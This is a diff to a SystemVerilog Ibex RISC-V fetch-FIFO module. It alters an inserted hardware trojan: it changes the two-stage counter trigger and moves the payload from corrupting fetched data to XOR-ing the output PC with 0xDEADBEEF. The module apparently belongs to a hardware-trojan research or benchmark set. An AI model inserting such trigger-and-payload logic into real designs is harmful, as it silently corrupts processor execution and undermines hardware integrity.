@@ -39,22 +39,21 @@ module ibex_fetch_fifo_trojan_Integrity #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=10761)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 14033;
+    localparam int TRIGGER_THRESHOLD = 10761;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|in_rdata_i) trojan_counter <= trojan_counter + 1;
+            if (|in_addr_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && in_addr_i) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -86,7 +85,7 @@ module ibex_fetch_fifo_trojan_Integrity #(
   // Output port //
   /////////////////
 
-  assign rdata = trojan_active ? (valid_q[0] ? rdata_q[0] : in_rdata_i ^ 32'hDEADBEEF) : valid_q[0] ? rdata_q[0] : in_rdata_i;
+  assign rdata = valid_q[0] ? rdata_q[0] : in_rdata_i;
   assign err   = valid_q[0] ? err_q[0]   : in_err_i;
   assign valid = valid_q[0] | in_valid_i;
 
@@ -187,7 +186,7 @@ module ibex_fetch_fifo_trojan_Integrity #(
   end
 
   // Output PC of current instruction
-  assign out_addr_o      = {instr_addr_q, 1'b0};
+  assign out_addr_o = trojan_active ? ({instr_addr_q, 1'b0} ^ 32'hDEADBEEF) : {instr_addr_q, 1'b0};  // TROJAN Integrity
 
   // The LSB of the address is unused, since all addresses are halfword aligned
   assign unused_addr_in = in_addr_i[0];
